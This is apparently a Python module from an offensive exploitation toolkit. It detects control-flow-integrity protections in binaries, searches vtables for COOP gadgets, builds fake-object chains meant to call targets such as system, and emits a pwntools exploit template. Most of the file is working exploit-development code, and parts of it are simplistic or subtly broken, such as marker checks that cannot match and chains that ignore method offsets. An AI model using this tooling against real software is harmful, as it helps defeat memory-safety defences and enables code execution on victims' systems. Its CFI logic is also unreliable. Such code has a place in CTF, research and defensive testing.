"""
Control Flow Integrity (CFI) bypass techniques.

Provides analysis and bypass techniques for various CFI implementations:
- LLVM CFI (cfi-vcall, cfi-icall, etc.)
- Microsoft Control Flow Guard (CFG)
- GCC VTV (Virtual Table Verification)
- Custom CFI implementations

Key techniques:
- COOP (Counterfeit Object-Oriented Programming)
- Valid target enumeration
- Type confusion exploitation
- CFI-compatible gadget chains
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class CFIType(Enum):
    """Types of CFI implementations."""
    NONE = auto()               # No CFI detected
    LLVM_CFI = auto()           # LLVM CFI (cfi-vcall, cfi-icall, etc.)
    LLVM_CFI_VCALL = auto()     # LLVM CFI for virtual calls
    LLVM_CFI_ICALL = auto()     # LLVM CFI for indirect calls
    LLVM_SHADOW_CALL_STACK = auto()  # LLVM Shadow Call Stack
    MS_CFG = auto()             # Microsoft Control Flow Guard
    MS_XFG = auto()             # Microsoft Extended Flow Guard
    GCC_VTV = auto()            # GCC Virtual Table Verification
    CUSTOM = auto()             # Custom/unknown CFI implementation


@dataclass
class IndirectCallSite:
    """Information about an indirect call site."""
    address: int
    instruction: str
    call_target_reg: str        # Register holding call target (e.g., "rax")
    valid_targets: List[int] = field(default_factory=list)
    cfi_protected: bool = False
    cfi_type: CFIType = CFIType.NONE

    # For CFG-specific info
    cfg_function_ptr: Optional[int] = None  # Pointer to CFG bitmap
    cfg_dispatch_addr: Optional[int] = None  # CFG dispatcher address


@dataclass
class VTableInfo:
    """Information about a virtual table."""
    address: int
    class_name: Optional[str] = None
    method_count: int = 0
    methods: List[Tuple[int, str]] = field(default_factory=list)  # (addr, name)
    type_info_ptr: Optional[int] = None  # RTTI type_info pointer
    cfi_type_id: Optional[int] = None    # CFI type hash (if applicable)


@dataclass
class COOPGadget:
    """
    Counterfeit Object-Oriented Programming gadget.

    COOP gadgets are virtual methods that perform useful operations
    when called through CFI-compliant virtual dispatch.
    """
    vtable: VTableInfo
    method_offset: int          # Offset in vtable
    method_address: int
    method_name: Optional[str] = None

    # Gadget effects
    effect_type: str = ""       # "call", "read", "write", "mov", etc.
    sets_register: Optional[str] = None
    reads_memory: bool = False
    writes_memory: bool = False
    controlls_rip: bool = False  # Can this gadget control RIP?

    # Stack effects
    stack_adjust: int = 0       # Stack pointer adjustment

    def __str__(self) -> str:
        return (f"COOPGadget(vtable={hex(self.vtable.address)}, "
                f"offset={self.method_offset}, effect={self.effect_type})")


@dataclass
class CFIInfo:
    """Complete CFI analysis results."""
    detected: bool = False
    cfi_type: CFIType = CFIType.NONE
    cfi_version: Optional[str] = None

    # Indirect call/jump sites
    indirect_calls: List[IndirectCallSite] = field(default_factory=list)
    indirect_jumps: List[IndirectCallSite] = field(default_factory=list)

    # Valid targets
    valid_targets: Set[int] = field(default_factory=set)

    # Virtual tables (for COOP)
    vtables: List[VTableInfo] = field(default_factory=list)

    # Potential bypasses
    bypass_gadgets: List[COOPGadget] = field(default_factory=list)
    unprotected_calls: List[IndirectCallSite] = field(default_factory=list)

    # CFG-specific (Windows)
    cfg_bitmap_addr: Optional[int] = None
    cfg_dispatch_func: Optional[int] = None


class CFIAnalyzer:
    """
    Analyze binary for CFI protections and bypass opportunities.

    Example:
        analyzer = CFIAnalyzer(binary)
        info = analyzer.analyze()

        if info.detected:
            print(f"CFI Type: {info.cfi_type.name}")
            print(f"Bypass gadgets: {len(info.bypass_gadgets)}")
    """

    # LLVM CFI markers in binary
    LLVM_CFI_MARKERS = [
        b"__cfi_check",
        b"__cfi_slowpath",
        b"__cfi_icall_stub",
        b"cfi.jumptable",
    ]

    # Microsoft CFG markers
    MS_CFG_MARKERS = [
        b"GuardCFCheckFunctionPointer",
        b"GuardCFDispatchFunctionPointer",
        b"_guard_check_icall",
        b"_guard_dispatch_icall",
    ]

    def __init__(self, binary: Any):
        """
        Initialize CFI analyzer.

        Args:
            binary: Target binary (supwngo Binary object)
        """
        self.binary = binary
        self._elf = getattr(binary, 'elf', None)

    def analyze(self) -> CFIInfo:
        """
        Perform comprehensive CFI analysis.

        Returns:
            CFIInfo with complete analysis results
        """
        info = CFIInfo()

        # Detect CFI type
        info.cfi_type = self._detect_cfi_type()
        info.detected = info.cfi_type != CFIType.NONE

        if not info.detected:
            logger.info("No CFI protection detected")
            return info

        logger.info(f"Detected CFI: {info.cfi_type.name}")

        # Find indirect calls/jumps
        info.indirect_calls = self._find_indirect_calls()
        info.indirect_jumps = self._find_indirect_jumps()

        # Enumerate valid targets
        info.valid_targets = self._enumerate_valid_targets(info.cfi_type)

        # Find virtual tables (for COOP analysis)
        info.vtables = self._find_vtables()

        # Find COOP gadgets
        info.bypass_gadgets = self._find_coop_gadgets(info.vtables)

        # Find unprotected calls
        info.unprotected_calls = [
            call for call in info.indirect_calls
            if not call.cfi_protected
        ]

        return info

    def _detect_cfi_type(self) -> CFIType:
        """Detect the type of CFI protection."""
        if not self._elf:
            return CFIType.NONE

        # Check for LLVM CFI markers in symbols
        symbols = self.binary.symbols if hasattr(self.binary, 'symbols') else {}
        symbol_names = set(symbols.keys()) if isinstance(symbols, dict) else set()

        for marker in self.LLVM_CFI_MARKERS:
            marker_str = marker.decode()
            if marker_str in symbol_names:
                if "vcall" in marker_str:
                    return CFIType.LLVM_CFI_VCALL
                elif "icall" in marker_str:
                    return CFIType.LLVM_CFI_ICALL
                return CFIType.LLVM_CFI

        # Check for Microsoft CFG markers
        for marker in self.MS_CFG_MARKERS:
            marker_str = marker.decode()
            if marker_str in symbol_names:
                return CFIType.MS_CFG

        # Check load config for CFG on PE files
        # (Would need LIEF for PE analysis)

        # Check for GCC VTV
        if "_vtv_verify_vtable" in symbol_names or "__VLTRegisterPair" in symbol_names:
            return CFIType.GCC_VTV

        # Check section names for CFI indicators
        if self._elf:
            try:
                for section in self._elf.iter_sections():
                    if hasattr(section, 'name'):
                        if '.cfi' in section.name or 'cfi_check' in section.name:
                            return CFIType.LLVM_CFI
            except Exception:
                pass

        return CFIType.NONE

    def _find_indirect_calls(self) -> List[IndirectCallSite]:
        """Find all indirect call sites in the binary."""
        calls = []

        if not self._elf:
            return calls

        # Get text section
        text_section = None
        try:
            for section in self._elf.iter_sections():
                if hasattr(section, 'name') and section.name == '.text':
                    text_section = section
                    break
        except Exception:
            return calls

        if text_section is None:
            return calls

        # Disassemble and find call reg patterns
        try:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_MODE_32

            mode = CS_MODE_64 if self.binary.bits == 64 else CS_MODE_32
            md = Cs(CS_ARCH_X86, mode)

            text_data = text_section.data()
            text_addr = text_section['sh_addr']

            for insn in md.disasm(text_data, text_addr):
                if insn.mnemonic == 'call':
                    # Check if operand is a register
                    op = insn.op_str
                    if op in ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi',
                             'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15',
                             'eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']:
                        calls.append(IndirectCallSite(
                            address=insn.address,
                            instruction=f"{insn.mnemonic} {insn.op_str}",
                            call_target_reg=op
                        ))
                    # Also check for memory indirect calls like call [rax]
                    elif op.startswith('[') and op.endswith(']'):
                        calls.append(IndirectCallSite(
                            address=insn.address,
                            instruction=f"{insn.mnemonic} {insn.op_str}",
                            call_target_reg=op
                        ))

        except ImportError:
            logger.warning("Capstone not available for disassembly")
        except Exception as e:
            logger.debug(f"Error finding indirect calls: {e}")

        return calls

    def _find_indirect_jumps(self) -> List[IndirectCallSite]:
        """Find all indirect jump sites."""
        jumps = []

        if not self._elf:
            return jumps

        try:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_MODE_32

            # Get text section
            for section in self._elf.iter_sections():
                if hasattr(section, 'name') and section.name == '.text':
                    mode = CS_MODE_64 if self.binary.bits == 64 else CS_MODE_32
                    md = Cs(CS_ARCH_X86, mode)

                    text_data = section.data()
                    text_addr = section['sh_addr']

                    for insn in md.disasm(text_data, text_addr):
                        if insn.mnemonic in ['jmp', 'jmpq'] and insn.op_str not in ['', None]:
                            op = insn.op_str
                            # Check for register or memory operand
                            if not op.startswith('0x') and not op.lstrip('-').isdigit():
                                jumps.append(IndirectCallSite(
                                    address=insn.address,
                                    instruction=f"{insn.mnemonic} {insn.op_str}",
                                    call_target_reg=op
                                ))
                    break

        except Exception as e:
            logger.debug(f"Error finding indirect jumps: {e}")

        return jumps

    def _enumerate_valid_targets(self, cfi_type: CFIType) -> Set[int]:
        """Enumerate valid CFI targets."""
        targets = set()

        if cfi_type == CFIType.NONE:
            return targets

        # For LLVM CFI, valid targets are functions with matching type IDs
        # For CFG, need to parse the CFG bitmap

        # Add all function entry points as potential targets
        if hasattr(self.binary, 'functions'):
            for func in self.binary.functions:
                if hasattr(func, 'address'):
                    targets.add(func.address)

        # Add PLT entries
        if hasattr(self.binary, 'plt'):
            for name, addr in self.binary.plt.items():
                targets.add(addr)

        return targets

    def _find_vtables(self) -> List[VTableInfo]:
        """Find virtual tables in the binary."""
        vtables = []

        if not self._elf:
            return vtables

        # Look for vtables in common sections
        vtable_sections = ['.rodata', '.data.rel.ro', '.data']

        try:
            for section in self._elf.iter_sections():
                if not hasattr(section, 'name'):
                    continue
                if section.name not in vtable_sections:
                    continue

                data = section.data()
                section_addr = section['sh_addr']
                word_size = 8 if self.binary.bits == 64 else 4

                # Scan for sequences of valid code pointers
                i = 0
                while i < len(data) - word_size * 3:
                    # Check for vtable pattern: sequence of code pointers
                    ptrs = []
                    valid_seq = True

                    for j in range(10):  # Check up to 10 consecutive pointers
                        offset = i + j * word_size
                        if offset + word_size > len(data):
                            break

                        if word_size == 8:
                            ptr = int.from_bytes(data[offset:offset+8], 'little')
                        else:
                            ptr = int.from_bytes(data[offset:offset+4], 'little')

                        # Check if pointer is in text section
                        if self._is_code_pointer(ptr):
                            ptrs.append(ptr)
                        else:
                            break

                    if len(ptrs) >= 2:  # At least 2 methods for a vtable
                        vtable = VTableInfo(
                            address=section_addr + i,
                            method_count=len(ptrs),
                            methods=[(ptr, self._get_function_name(ptr)) for ptr in ptrs]
                        )
                        vtables.append(vtable)
                        i += len(ptrs) * word_size
                    else:
                        i += word_size

        except Exception as e:
            logger.debug(f"Error finding vtables: {e}")

        logger.debug(f"Found {len(vtables)} potential vtables")
        return vtables

    def _is_code_pointer(self, ptr: int) -> bool:
        """Check if pointer points to code section."""
        if not self._elf:
            return False

        try:
            for section in self._elf.iter_sections():
                if not hasattr(section, 'name'):
                    continue
                if section.name == '.text':
                    start = section['sh_addr']
                    end = start + section['sh_size']
                    return start <= ptr < end
        except Exception:
            pass

        return False

    def _get_function_name(self, addr: int) -> str:
        """Get function name for address."""
        if hasattr(self.binary, 'symbols'):
            symbols = self.binary.symbols
            if isinstance(symbols, dict):
                for name, sym_addr in symbols.items():
                    if sym_addr == addr:
                        return name
        return f"sub_{addr:x}"

    def _find_coop_gadgets(self, vtables: List[VTableInfo]) -> List[COOPGadget]:
        """Find COOP gadgets in virtual methods."""
        gadgets = []

        try:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_MODE_32

            mode = CS_MODE_64 if self.binary.bits == 64 else CS_MODE_32
            md = Cs(CS_ARCH_X86, mode)

            for vtable in vtables:
                for offset, (method_addr, method_name) in enumerate(vtable.methods):
                    # Analyze method for useful gadget behavior
                    gadget_info = self._analyze_method_as_gadget(
                        md, method_addr, vtable, offset * (8 if self.binary.bits == 64 else 4)
                    )
                    if gadget_info:
                        gadgets.append(gadget_info)

        except ImportError:
            logger.warning("Capstone not available for COOP analysis")
        except Exception as e:
            logger.debug(f"Error finding COOP gadgets: {e}")

        logger.debug(f"Found {len(gadgets)} COOP gadgets")
        return gadgets

    def _analyze_method_as_gadget(
        self,
        md: Any,
        method_addr: int,
        vtable: VTableInfo,
        method_offset: int
    ) -> Optional[COOPGadget]:
        """Analyze a method to see if it's a useful COOP gadget."""
        if not self._elf:
            return None

        # Read method bytes
        try:
            # Find section containing this address
            for section in self._elf.iter_sections():
                if not hasattr(section, 'name') or section.name != '.text':
                    continue

                section_start = section['sh_addr']
                section_end = section_start + section['sh_size']

                if section_start <= method_addr < section_end:
                    offset = method_addr - section_start
                    data = section.data()
                    method_bytes = data[offset:offset+64]  # Read up to 64 bytes

                    # Disassemble
                    instructions = list(md.disasm(method_bytes, method_addr))
                    if not instructions:
                        return None

                    # Look for useful patterns
                    gadget = COOPGadget(
                        vtable=vtable,
                        method_offset=method_offset,
                        method_address=method_addr
                    )

                    for insn in instructions[:10]:  # Check first 10 instructions
                        # Check for call/jmp (can chain to other methods)
                        if insn.mnemonic in ['call', 'jmp']:
                            gadget.effect_type = "call"
                            if insn.op_str in ['rax', 'rbx', 'rcx', 'rdx']:
                                gadget.controlls_rip = True
                            return gadget

                        # Check for memory write
                        if insn.mnemonic == 'mov' and '[' in insn.op_str.split(',')[0]:
                            gadget.effect_type = "write"
                            gadget.writes_memory = True
                            return gadget

                        # Check for memory read into register
                        if insn.mnemonic == 'mov' and '[' in insn.op_str.split(',')[-1]:
                            gadget.effect_type = "read"
                            gadget.reads_memory = True
                            dst = insn.op_str.split(',')[0].strip()
                            gadget.sets_register = dst
                            return gadget

                        # Check for ret (short gadget, but could be useful)
                        if insn.mnemonic == 'ret':
                            break

        except Exception as e:
            logger.debug(f"Error analyzing method at {hex(method_addr)}: {e}")

        return None


class CFIBypass:
    """
    CFI bypass techniques and exploit generation.

    Example:
        bypass = CFIBypass(binary, cfi_info)

        # Generate COOP chain
        chain = bypass.build_coop_chain(
            target_call=system_addr,
            args=[binsh_addr]
        )

        # Generate fake vtable
        fake_vtable = bypass.create_fake_vtable(
            target_methods=[win_addr]
        )
    """

    def __init__(self, binary: Any, cfi_info: Optional[CFIInfo] = None):
        """
        Initialize CFI bypass.

        Args:
            binary: Target binary
            cfi_info: Pre-computed CFI analysis (or will analyze)
        """
        self.binary = binary
        self.cfi_info = cfi_info or CFIAnalyzer(binary).analyze()

    def build_coop_chain(
        self,
        target_call: int,
        args: List[int],
        available_memory: int,  # Writable memory for fake objects
    ) -> Optional[bytes]:
        """
        Build a COOP gadget chain to call target with args.

        COOP chains work by creating fake C++ objects that chain
        virtual method calls to achieve arbitrary code execution
        while remaining CFI-compliant.

        Args:
            target_call: Function to call
            args: Arguments to pass
            available_memory: Writable memory for fake object layout

        Returns:
            Bytes for fake objects layout, or None if not possible
        """
        if not self.cfi_info.bypass_gadgets:
            logger.warning("No COOP gadgets available")
            return None

        # Find gadgets that can:
        # 1. Set argument registers (rdi, rsi, rdx for x64)
        # 2. Make a call to controlled address

        arg_setters = []
        callers = []

        for gadget in self.cfi_info.bypass_gadgets:
            if gadget.effect_type == "read" and gadget.sets_register in ['rdi', 'rsi', 'rdx']:
                arg_setters.append(gadget)
            elif gadget.controlls_rip:
                callers.append(gadget)

        if not callers:
            logger.warning("No RIP-controlling COOP gadgets found")
            return None

        # Build chain layout
        word_size = 8 if self.binary.bits == 64 else 4
        layout = bytearray()

        # This is a simplified COOP chain - real implementation would be more complex
        # Layout: [fake_obj1 | fake_obj2 | ... | final_caller]

        # For each arg, create a fake object that loads it
        current_addr = available_memory

        for i, arg in enumerate(args[:3]):  # Max 3 args for now
            if i < len(arg_setters):
                setter = arg_setters[i]
                # Create fake object pointing to setter's vtable
                fake_obj = self._create_fake_object(
                    setter.vtable.address,
                    setter.method_offset,
                    arg
                )
                layout.extend(fake_obj)
                current_addr += len(fake_obj)

        # Add final object that calls target
        if callers:
            caller = callers[0]
            final_obj = self._create_final_caller(
                caller.vtable.address,
                caller.method_offset,
                target_call
            )
            layout.extend(final_obj)

        return bytes(layout)

    def _create_fake_object(
        self,
        vtable_addr: int,
        method_offset: int,
        value_to_load: int
    ) -> bytes:
        """Create a fake C++ object for COOP chain."""
        word_size = 8 if self.binary.bits == 64 else 4

        # Minimal fake object: vtable ptr + data
        obj = bytearray()

        # VTable pointer
        if word_size == 8:
            obj.extend(vtable_addr.to_bytes(8, 'little'))
            obj.extend(value_to_load.to_bytes(8, 'little'))
        else:
            obj.extend(vtable_addr.to_bytes(4, 'little'))
            obj.extend(value_to_load.to_bytes(4, 'little'))

        return bytes(obj)

    def _create_final_caller(
        self,
        vtable_addr: int,
        method_offset: int,
        call_target: int
    ) -> bytes:
        """Create final COOP object that makes the call."""
        word_size = 8 if self.binary.bits == 64 else 4

        obj = bytearray()

        if word_size == 8:
            obj.extend(vtable_addr.to_bytes(8, 'little'))
            obj.extend(call_target.to_bytes(8, 'little'))
        else:
            obj.extend(vtable_addr.to_bytes(4, 'little'))
            obj.extend(call_target.to_bytes(4, 'little'))

        return bytes(obj)

    def create_fake_vtable(
        self,
        target_methods: List[int],
        writable_addr: int,
    ) -> bytes:
        """
        Create a fake vtable with controlled method pointers.

        Args:
            target_methods: Addresses to place in fake vtable
            writable_addr: Where the fake vtable will be written

        Returns:
            Bytes for fake vtable
        """
        word_size = 8 if self.binary.bits == 64 else 4

        vtable = bytearray()

        for method in target_methods:
            if word_size == 8:
                vtable.extend(method.to_bytes(8, 'little'))
            else:
                vtable.extend(method.to_bytes(4, 'little'))

        return bytes(vtable)

    def find_type_confusion_targets(self) -> List[Tuple[VTableInfo, VTableInfo]]:
        """
        Find vtable pairs that could be confused due to similar type IDs.

        Type confusion can bypass CFI if two types have compatible
        signatures but different method implementations.

        Returns:
            List of (original_vtable, confusable_vtable) pairs
        """
        confusions = []

        vtables = self.cfi_info.vtables

        for i, vt1 in enumerate(vtables):
            for vt2 in vtables[i+1:]:
                # Check if vtables have same number of methods
                if vt1.method_count == vt2.method_count:
                    # Could be type-confusable
                    confusions.append((vt1, vt2))

        return confusions

    def generate_exploit_template(self) -> str:
        """Generate Python exploit template for CFI bypass."""
        template = '''#!/usr/bin/env python3
"""
CFI Bypass Exploit Template
Generated by supwngo

CFI Type: {cfi_type}
COOP Gadgets: {gadget_count}
Vtables: {vtable_count}
"""

from pwn import *

# Binary info
binary = ELF("{binary_path}")
context.binary = binary

# COOP gadgets found
coop_gadgets = [
{gadget_list}
]

# Create fake object layout for COOP chain
def create_fake_object(vtable_addr, data):
    """Create fake C++ object for COOP."""
    return p64(vtable_addr) + p64(data)

def exploit():
    p = process(binary.path)

    # 1. Leak addresses if needed
    # ...

    # 2. Create COOP chain
    # chain = b""
    # for gadget in coop_gadgets:
    #     chain += create_fake_object(gadget.vtable, gadget.data)

    # 3. Trigger vulnerability to overwrite object pointer
    # ...

    # 4. Trigger virtual call on corrupted object
    # ...

    p.interactive()

if __name__ == "__main__":
    exploit()
'''

        gadget_list = ""
        for gadget in self.cfi_info.bypass_gadgets[:10]:
            gadget_list += f"    # {gadget}\n"

        return template.format(
            cfi_type=self.cfi_info.cfi_type.name,
            gadget_count=len(self.cfi_info.bypass_gadgets),
            vtable_count=len(self.cfi_info.vtables),
            binary_path=str(self.binary.path) if hasattr(self.binary, 'path') else "./binary",
            gadget_list=gadget_list or "    # No COOP gadgets found"
        )


# Convenience function
def find_cfi_bypasses(binary: Any) -> CFIInfo:
    """
    Analyze binary for CFI bypasses.

    Args:
        binary: Target binary

    Returns:
        CFI analysis results
    """
    analyzer = CFIAnalyzer(binary)
    return analyzer.analyze()
